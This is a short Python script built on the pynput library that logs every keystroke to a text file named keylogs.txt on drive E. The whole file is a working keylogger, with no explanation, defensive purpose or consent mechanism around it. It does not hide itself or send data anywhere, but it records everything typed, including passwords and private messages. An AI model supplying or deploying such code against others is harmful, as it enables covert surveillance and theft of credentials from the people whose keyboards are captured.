import pynput

def on_press(key):
    with open("E:\\keylogs.txt", "a") as log_file:  
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f" [{key}] ")

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
